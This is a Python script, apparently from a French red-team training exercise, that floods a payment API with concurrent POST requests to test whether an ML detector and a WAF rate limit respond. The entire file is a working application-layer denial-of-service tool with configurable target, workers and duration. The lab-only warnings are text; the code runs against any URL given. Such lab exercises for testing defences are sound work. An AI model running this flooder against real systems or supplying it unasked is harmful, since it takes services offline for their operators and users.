#!/usr/bin/env python3
"""
Attaque Red Team : flood HTTP de l'API de paiement (deni de service applicatif).

A LANCER DEPUIS LE PC ATTAQUANT, uniquement contre le SI fictif de votre
equipe. Perimetre strictement limite a votre reseau RESILIENCE-G<n>.

Effet observable : le debit de requetes sur l'API explose. Le detecteur ML
le repere, le moteur de remediation active la limite de debit du WAF, le flood
est absorbe (reponses 429) et le service metier redevient utilisable.

Aucune dependance : bibliotheque standard Python 3 uniquement.

    python flood.py --target http://192.168.137.1:8088 --duration 30 --workers 60
"""

import argparse
import json
import threading
import time
import urllib.error
import urllib.request
from collections import Counter

stop = threading.Event()
counts = Counter()
lock = threading.Lock()


def worker(url, method, payload):
    data = payload.encode() if payload else None
    while not stop.is_set():
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", "application/json")
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                code = resp.status
        except urllib.error.HTTPError as e:
            code = e.code           # 401, 429 (WAF), 503...
        except Exception:
            code = 0                # timeout / connexion refusee
        with lock:
            counts[code] += 1


def main():
    p = argparse.ArgumentParser(description="Flood HTTP (laboratoire uniquement)")
    p.add_argument("--target", default="http://192.168.137.1:8088",
                   help="URL de base du SI (WAF du PC Hote)")
    p.add_argument("--path", default="/api/payments", help="Chemin a marteler")
    p.add_argument("--method", default="POST")
    p.add_argument("--duration", type=int, default=30, help="Duree en secondes")
    p.add_argument("--workers", type=int, default=60, help="Requetes concurrentes")
    args = p.parse_args()

    url = args.target.rstrip("/") + args.path
    payload = json.dumps({"amount": 1, "currency": "EUR"}) if args.method == "POST" else None

    print(f"[!] Flood {args.method} {url}  ({args.workers} workers, {args.duration}s)")
    print("[!] Perimetre : SI fictif de l'equipe uniquement. Ctrl+C pour arreter.\n")

    threads = [threading.Thread(target=worker, args=(url, args.method, payload), daemon=True)
               for _ in range(args.workers)]
    for t in threads:
        t.start()

    start = time.time()
    try:
        while time.time() - start < args.duration:
            time.sleep(2)
            with lock:
                total = sum(counts.values())
                throttled = counts.get(429, 0)
            elapsed = time.time() - start
            print(f"  t+{elapsed:4.0f}s  envoyees={total:6d}  "
                  f"~{total/elapsed:5.0f} req/s  429(WAF)={throttled}")
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        time.sleep(0.5)

    total = sum(counts.values())
    print("\n=== Bilan ===")
    print(f"Requetes envoyees : {total}")
    for code in sorted(counts):
        name = {0: "echec/timeout", 401: "401 (non authentifie)",
                429: "429 (limite WAF = remediation active)", 503: "503"}.get(code, str(code))
        print(f"  {name:40s} : {counts[code]}")
    if counts.get(429):
        print("\n[OK] Des reponses 429 : la limite de debit du WAF a ete activee "
              "pendant l'attaque (remediation).")


if __name__ == "__main__":
    main()
